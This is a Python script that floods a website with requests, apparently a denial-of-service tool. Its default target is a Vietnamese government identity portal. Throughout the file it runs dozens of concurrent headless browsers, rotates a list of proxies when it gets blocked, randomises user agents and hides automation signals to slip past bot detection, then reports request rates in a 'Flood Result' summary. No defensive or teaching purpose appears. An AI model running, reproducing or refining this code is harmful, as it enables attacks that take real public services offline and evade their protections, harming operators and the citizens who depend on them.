import asyncio
import random
import time
import os
import json
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://vneid.gov.vn/")
DURATION = int(os.getenv("DURATION", "60"))   # tăng thời gian tấn công
CONCURRENCY = int(os.getenv("CONCURRENCY", "50"))  # tăng số lượng worker
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "20"))  # tăng số request mỗi vòng
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "2"))  # giảm số lần thất bại cho phép
PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "20"))  # giảm thời gian chờ
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "60000"))  # tăng timeout
MAX_RETRIES = int(os.getenv("MAX_RETRIES", "5"))  # tăng số lần thử lại
MIN_DELAY = float(os.getenv("MIN_DELAY", "0.1"))  # độ trễ tối thiểu giữa các request
MAX_DELAY = float(os.getenv("MAX_DELAY", "0.5"))  # độ trễ tối đa giữa các request

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

success = 0
fail = 0
status_count = {}

class AdvancedProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.proxy_status = {proxy: {"failures": 0, "last_failure": 0, "blocked": False, "success_count": 0, "response_times": []} for proxy in self.proxies}
        self.current_proxy_index = 0
        self.lock = asyncio.Lock()
        self.proxy_performance = {}
    
    def load_proxies(self):
        """Load proxies from file"""
        proxies = []
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
            print(f"Loaded {len(proxies)} proxies from {self.proxy_file}")
            return proxies
        except FileNotFoundError:
            print(f"Proxy file {self.proxy_file} not found. Running without proxies.")
            return []
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return []
    
    async def get_next_proxy(self):
        """Get next available proxy based on performance"""
        async with self.lock:
            if not self.proxies:
                return None
            
            # Calculate performance score for each proxy
            for proxy in self.proxies:
                if proxy in self.proxy_performance:
                    perf = self.proxy_performance[proxy]
                    # Performance score = success rate / average response time
                    success_rate = perf["success_count"] / max(1, perf["total_count"])
                    avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                    perf["score"] = success_rate / max(0.1, avg_response_time / 1000)  # Normalize response time to seconds
                else:
                    self.proxy_performance[proxy] = {
                        "success_count": 0,
                        "total_count": 0,
                        "response_times": [],
                        "score": 0.1  # Default score for untested proxies
                    }
            
            # Sort proxies by performance score (descending)
            sorted_proxies = sorted(
                self.proxies, 
                key=lambda p: self.proxy_performance[p]["score"],
                reverse=True
            )
            
            # Try to find a proxy that's not blocked
            for proxy in sorted_proxies:
                proxy_info = self.proxy_status[proxy]
                
                # Check if proxy is blocked or in cooldown
                current_time = time.time()
                if (not proxy_info["blocked"] and 
                    (current_time - proxy_info["last_failure"] > PROXY_COOLDOWN or 
                     proxy_info["failures"] < MAX_FAILURES)):
                    return proxy
            
            # If all proxies are blocked, return the one with the highest score
            return sorted_proxies[0] if sorted_proxies else None
    
    async def mark_proxy_result(self, proxy, success, response_time=None):
        """Mark a proxy result and update performance metrics"""
        if proxy and proxy in self.proxy_status:
            async with self.lock:
                if success:
                    self.proxy_status[proxy]["failures"] = 0
                    self.proxy_status[proxy]["last_failure"] = 0
                    self.proxy_status[proxy]["success_count"] += 1
                    
                    # Update performance metrics
                    if proxy in self.proxy_performance and response_time:
                        perf = self.proxy_performance[proxy]
                        perf["success_count"] += 1
                        perf["total_count"] += 1
                        perf["response_times"].append(response_time)
                        
                        # Keep only the last 10 response times
                        if len(perf["response_times"]) > 10:
                            perf["response_times"] = perf["response_times"][-10:]
                        
                        # Recalculate score
                        success_rate = perf["success_count"] / max(1, perf["total_count"])
                        avg_response_time = sum(perf["response_times"]) / max(1, len(perf["response_times"]))
                        perf["score"] = success_rate / max(0.1, avg_response_time / 1000)
                else:
                    self.proxy_status[proxy]["failures"] += 1
                    self.proxy_status[proxy]["last_failure"] = time.time()
                    
                    # Block proxy if it failed too many times
                    if self.proxy_status[proxy]["failures"] >= MAX_FAILURES:
                        self.proxy_status[proxy]["blocked"] = True
                        print(f"Proxy {proxy} blocked due to too many failures")
    
    def get_proxy_stats(self):
        """Get statistics about proxy status"""
        total = len(self.proxies)
        blocked = sum(1 for proxy in self.proxies if self.proxy_status[proxy]["blocked"])
        available = total - blocked
        
        # Get top 5 best proxies
        best_proxies = sorted(
            self.proxies, 
            key=lambda p: self.proxy_performance[p]["score"] if p in self.proxy_performance else 0,
            reverse=True
        )[:5]
        
        return {
            "total": total,
            "blocked": blocked,
            "available": available,
            "best_proxies": best_proxies
        }

async def make_request_with_retry(context, url, proxy_manager, proxy, max_retries=MAX_RETRIES):
    """Make a request with retry logic and performance tracking"""
    start_time = time.time()
    
    for attempt in range(max_retries + 1):
        try:
            response = await context.request.get(url, timeout=REQUEST_TIMEOUT)
            response_time = int((time.time() - start_time) * 1000)  # Convert to milliseconds
            
            # Mark proxy result
            await proxy_manager.mark_proxy_result(proxy, response.ok, response_time)
            
            return response
        except Exception as e:
            if attempt < max_retries:
                # Wait before retry (exponential backoff)
                wait_time = min(2 ** attempt, 5)  # Max wait time is 5 seconds
                await asyncio.sleep(wait_time)
            else:
                # Mark proxy as failed
                await proxy_manager.mark_proxy_result(proxy, False)
                raise e

async def attack(playwright, worker_id, proxy_manager):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)
    
    # Get initial proxy
    proxy = await proxy_manager.get_next_proxy()
    
    browser_args = [
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-setuid-sandbox",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        "--disable-software-rasterizer",
        "--disable-extensions",
        "--disable-plugins",
        "--disable-images",  # Disable images to speed up loading
        "--disable-javascript-har-prometheus-prometheus",  # Disable some browser fingerprinting
        "--disable-blink-features=AutomationControlled"  # Disable automation detection
    ]
    
    # Launch browser with or without proxy
    if proxy:
        try:
            browser = await playwright.chromium.launch(
                headless=True,
                proxy={
                    "server": proxy
                },
                args=browser_args
            )
            print(f"Worker {worker_id} using proxy: {proxy}")
        except Exception as e:
            print(f"Worker {worker_id}: Failed to launch browser with proxy {proxy}: {e}")
            # Try without proxy
            browser = await playwright.chromium.launch(
                headless=True,
                args=browser_args
            )
            print(f"Worker {worker_id} running without proxy after failure")
            proxy = None
    else:
        browser = await playwright.chromium.launch(
            headless=True,
            args=browser_args
        )
        print(f"Worker {worker_id} running without proxy")
    
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers={
            "Accept-Language": lang,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1"
        },
        ignore_https_errors=True,
        java_script_enabled=False,  # Disable JavaScript to avoid detection
        bypass_csp=True  # Bypass Content Security Policy
    )

    start = time.time()
    consecutive_failures = 0
    proxy_rotation_count = 0
    max_proxy_rotations = 20  # Increased maximum number of proxy rotations per worker
    
    while time.time() - start < DURATION and proxy_rotation_count < max_proxy_rotations:
        try:
            # Create tasks with random delays to simulate human behavior
            tasks = []
            for i in range(REQ_PER_LOOP):
                # Add random delay between requests
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                tasks.append(asyncio.sleep(delay))
                tasks.append(make_request_with_retry(context, TARGET_URL, proxy_manager, proxy))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)

            batch_success = 0
            batch_fail = 0

            # Process only the request results (skip sleep results)
            for i, res in enumerate(results):
                if i % 2 == 1:  # Every other result is a request (odd indices)
                    if isinstance(res, Exception):
                        fail += 1
                        batch_fail += 1
                        status_count["exception"] = status_count.get("exception", 0) + 1
                    else:
                        if res.ok:
                            success += 1
                            batch_success += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
                        else:
                            fail += 1
                            batch_fail += 1
                            status_count[res.status] = status_count.get(res.status, 0) + 1
            
            # Check if we need to rotate proxy
            if proxy:
                total_requests = batch_success + batch_fail
                success_rate = batch_success / total_requests if total_requests > 0 else 0
                
                if success_rate < 0.1:  # Lower threshold for proxy rotation (10%)
                    consecutive_failures += 1
                    
                    # If too many consecutive failures, rotate proxy
                    if consecutive_failures >= 1:  # Reduced threshold for faster rotation
                        print(f"Worker {worker_id}: Low success rate ({success_rate:.2%}) with proxy {proxy}, rotating...")
                        
                        # Close current browser and context
                        await context.close()
                        await browser.close()
                        
                        # Get new proxy
                        new_proxy = await proxy_manager.get_next_proxy()
                        if new_proxy != proxy:
                            proxy = new_proxy
                            proxy_rotation_count += 1
                            print(f"Worker {worker_id} switched to new proxy ({proxy_rotation_count}/{max_proxy_rotations}): {proxy}")
                            
                            # Launch new browser with new proxy
                            try:
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    proxy={
                                        "server": proxy
                                    },
                                    args=browser_args
                                )
                                context = await browser.new_context(
                                    user_agent=ua,
                                    extra_http_headers={
                                        "Accept-Language": lang,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                        "Accept-Encoding": "gzip, deflate, br",
                                        "Cache-Control": "max-age=0",
                                        "Connection": "keep-alive",
                                        "Upgrade-Insecure-Requests": "1",
                                        "Sec-Fetch-Dest": "document",
                                        "Sec-Fetch-Mode": "navigate",
                                        "Sec-Fetch-Site": "none",
                                        "Sec-Fetch-User": "?1"
                                    },
                                    ignore_https_errors=True,
                                    java_script_enabled=False,
                                    bypass_csp=True
                                )
                            except Exception as e:
                                print(f"Worker {worker_id}: Failed to launch browser with new proxy {proxy}: {e}")
                                # Try without proxy
                                browser = await playwright.chromium.launch(
                                    headless=True,
                                    args=browser_args
                                )
                                context = await browser.new_context(
                                    user_agent=ua,
                                    extra_http_headers={
                                        "Accept-Language": lang,
                                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                        "Accept-Encoding": "gzip, deflate, br",
                                        "Cache-Control": "max-age=0",
                                        "Connection": "keep-alive",
                                        "Upgrade-Insecure-Requests": "1",
                                        "Sec-Fetch-Dest": "document",
                                        "Sec-Fetch-Mode": "navigate",
                                        "Sec-Fetch-Site": "none",
                                        "Sec-Fetch-User": "?1"
                                    },
                                    ignore_https_errors=True,
                                    java_script_enabled=False,
                                    bypass_csp=True
                                )
                                proxy = None
                        
                        consecutive_failures = 0
                else:
                    # If batch was successful, reset consecutive failures
                    consecutive_failures = 0
            
        except Exception as e:
            print(f"Worker {worker_id}: Error in batch: {e}")
            if proxy:
                await proxy_manager.mark_proxy_result(proxy, False)

    await browser.close()

async def main():
    # Initialize proxy manager
    proxy_manager = AdvancedProxyManager(PROXY_FILE)
    
    # Print proxy statistics
    stats = proxy_manager.get_proxy_stats()
    print(f"Proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
    print(f"Top 5 best proxies: {stats['best_proxies']}")
    
    async with async_playwright() as p:
        tasks = [attack(p, i, proxy_manager) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {DURATION} seconds")
    print(f"Concurrency: {CONCURRENCY}")
    print(f"Requests per loop: {REQ_PER_LOOP}")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"Success rate: {success/total*100:.2f}%")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", status_count)
    
    # Print final proxy statistics
    stats = proxy_manager.get_proxy_stats()
    print(f"Final proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
    print(f"Top 5 best proxies: {stats['best_proxies']}")

if __name__ == "__main__":
    asyncio.run(main())
